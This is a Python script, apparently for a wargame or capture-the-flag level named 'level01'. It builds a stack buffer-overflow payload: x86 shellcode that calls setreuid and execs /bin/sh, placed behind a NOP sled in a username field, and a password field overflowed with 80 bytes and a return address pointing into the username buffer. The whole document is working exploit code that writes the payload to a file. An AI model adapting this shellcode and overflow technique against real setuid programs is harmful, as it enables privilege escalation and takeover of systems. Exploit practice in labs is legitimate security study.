import struct
import sys

A_USER_NAME = 0x0804a040
RET_ADDR = A_USER_NAME + 20

OFFSET = 80

shellcode = (
    b"\x31\xc0\xb0\x31\xcd\x80"      # geteuid()
    b"\x89\xc3\x89\xc1"              # ebx = eax, ecx = eax
    b"\x31\xc0\xb0\x46\xcd\x80"      # setreuid(euid, euid)
    b"\x31\xc0\x50"                  # push NULL
    b"\x68\x2f\x2f\x73\x68"          # push "//sh"
    b"\x68\x2f\x62\x69\x6e"          # push "/bin"
    b"\x89\xe3\x50\x53\x89\xe1"      # ebx="/bin//sh", argv
    b"\x99\xb0\x0b\xcd\x80"          # execve("/bin/sh", argv, NULL)
)

username = b"dat_wil" + b"\x90" * 100 + shellcode
password = b"A" * OFFSET + struct.pack("<I", RET_ADDR)

payload = username + b"\n" + password + b"\n"


with open("payload_level01", "wb") as f: f.write(payload)

print("[+] Payload created: payload_level01")
print("[+] Username length:", len(username))
print("[+] Password length:", len(password))
print("[+] Return address:", hex(RET_ADDR))
print("[+] Offset:", OFFSET)
